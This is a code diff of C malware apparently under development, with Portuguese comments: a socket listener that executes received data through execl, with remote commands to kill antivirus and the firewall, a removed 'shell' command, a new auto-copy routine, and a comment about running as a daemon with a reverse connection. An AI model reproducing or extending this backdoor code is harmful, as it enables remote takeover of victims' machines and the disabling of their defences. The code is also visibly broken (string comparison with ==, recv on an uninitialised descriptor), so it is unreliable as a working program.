@@ -212,16 +212,19 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
      if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
      perror("setsockopt(SO_REUSEADDR)failed");
 
-      char buf[bytes];
+         char buf[bytes];
     // FILE *cmd;
+       int t;
 
         //for(;;)
-        while((x=recv(x, buf, sizeof buf,  0) > 0)) {
+        while((x=recv(t, buf, sizeof buf,  0) > 0)) {
         //if(x == false)
         // buf = "";
-         x = execl(buf,"r",0);
+         t = execl(buf,"r",0);
+         t = sizeof(buf);
+         //read(t, buf, 4096);
         //send(x, buf, strlen(buf), 0);
-         //printf("%s",buf); ; to debug stuffs, all right for here. /
+        // printf("%s",read(t,buf,4096)); //; to debug stuffs, all right for here. /
 
             if(buf == "killav")
             {
@@ -231,9 +234,9 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
             {
                 kill_firewall();
             }
-            else if(buf == "shell")
-            {
-                    shell();
+            else if(buf == "autocp")
+            {      
+                auto_copy();
             }
             else
 	         	sleep(0.2);
@@ -241,7 +244,6 @@ terraquian date: 4/10/2017 - 04:57 AM - *** in desenvolpment.
             }
 
    }
-
 
   /*função para o programa rodar em background, como uma daemon
    create reverse connection */
